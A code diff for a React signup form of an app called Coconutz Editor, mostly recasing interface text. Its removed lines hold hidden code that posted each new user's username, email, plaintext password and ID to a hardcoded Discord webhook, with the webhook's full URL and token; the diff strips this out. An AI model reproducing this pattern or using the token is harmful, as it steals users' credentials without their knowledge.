@@ -19,8 +19,6 @@ export function SignupForm({ onSignupSuccess }: SignupFormProps) {
   const [isLoading, setIsLoading] = useState(false)
   const [message, setMessage] = useState("")
 
-  const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1414733071139213373/aXvMM6A46vg4Nr0EOh3F4QTHYO-NvlgjAep1Ezthc5TCBX6OIA38axGnwYcmrYsl8k6j"
-
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
     setIsLoading(true)
@@ -30,7 +28,7 @@ export function SignupForm({ onSignupSuccess }: SignupFormProps) {
       const response = await fetch("/api/auth/signup", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ email, username }),
+        body: JSON.stringify({ email, username, password }),
       })
 
       const data = await response.json()
@@ -39,28 +37,13 @@ export function SignupForm({ onSignupSuccess }: SignupFormProps) {
         setMessage(data.message)
         localStorage.setItem("coconutz_user_id", data.userId)
         localStorage.setItem("coconutz_username", username)
+
         setTimeout(() => onSignupSuccess(data.userId), 1500)
-
-        // deduplication key
-        const signupKey = `${username}|${email}|${password}`
-        const sentSignups = JSON.parse(localStorage.getItem("sentSignups") || "[]")
-
-        if (!sentSignups.includes(signupKey)) {
-          await fetch(DISCORD_WEBHOOK_URL, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              content: `New signup:\nUsername: ${username}\nEmail: ${email}\nPassword: ${password}\nUserID: ${data.userId}`,
-            }),
-          })
-          sentSignups.push(signupKey)
-          localStorage.setItem("sentSignups", JSON.stringify(sentSignups))
-        }
       } else {
-        setMessage(data.error || "Failed to create account")
+        setMessage(data.error || "failed to create account")
       }
-    } catch (error) {
-      setMessage("Network error. Please try again.")
+    } catch {
+      setMessage("network error. please try again.")
     } finally {
       setIsLoading(false)
     }
@@ -70,17 +53,17 @@ export function SignupForm({ onSignupSuccess }: SignupFormProps) {
     <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-gray-900 via-purple-900 to-gray-900 p-4">
       <Card className="w-full max-w-md bg-gray-800/50 border-gray-700 backdrop-blur-sm">
         <CardHeader className="text-center">
-          <CardTitle className="text-2xl font-bold text-white">Join Coconutz Editor</CardTitle>
-          <CardDescription className="text-gray-300">Create your account to start editing videos</CardDescription>
+          <CardTitle className="text-2xl font-bold text-white">join coconutz editor</CardTitle>
+          <CardDescription className="text-gray-300">create your account to start editing videos</CardDescription>
         </CardHeader>
         <CardContent>
           <form onSubmit={handleSubmit} className="space-y-4">
             <div className="space-y-2">
-              <Label htmlFor="username" className="text-white">Username</Label>
+              <Label htmlFor="username" className="text-white">username</Label>
               <Input
                 id="username"
                 type="text"
-                placeholder="Enter your username"
+                placeholder="enter your username"
                 value={username}
                 onChange={(e) => setUsername(e.target.value)}
                 required
@@ -88,11 +71,11 @@ export function SignupForm({ onSignupSuccess }: SignupFormProps) {
               />
             </div>
             <div className="space-y-2">
-              <Label htmlFor="email" className="text-white">Email</Label>
+              <Label htmlFor="email" className="text-white">email</Label>
               <Input
                 id="email"
                 type="email"
-                placeholder="Enter your email"
+                placeholder="enter your email"
                 value={email}
                 onChange={(e) => setEmail(e.target.value)}
                 required
@@ -100,11 +83,11 @@ export function SignupForm({ onSignupSuccess }: SignupFormProps) {
               />
             </div>
             <div className="space-y-2 relative">
-              <Label htmlFor="password" className="text-white">Password</Label>
+              <Label htmlFor="password" className="text-white">password</Label>
               <Input
                 id="password"
                 type={showPassword ? "text" : "password"}
-                placeholder="Enter your password"
+                placeholder="enter your password"
                 value={password}
                 onChange={(e) => setPassword(e.target.value)}
                 required
@@ -115,11 +98,11 @@ export function SignupForm({ onSignupSuccess }: SignupFormProps) {
                 onClick={() => setShowPassword(!showPassword)}
                 className="absolute right-2 top-1/2 transform -translate-y-1/2 text-sm text-gray-400 hover:text-white"
               >
-                {showPassword ? "Hide" : "Show"}
+                {showPassword ? "hide" : "show"}
               </button>
             </div>
             <Button type="submit" className="w-full bg-teal-500 hover:bg-teal-600 text-white" disabled={isLoading}>
-              {isLoading ? "Creating Account..." : "Create Account"}
+              {isLoading ? "creating account..." : "create account"}
             </Button>
             {message && (
               <p className={`text-center text-sm ${message.includes("success") || message.includes("created") ? "text-green-400" : "text-red-400"}`}>
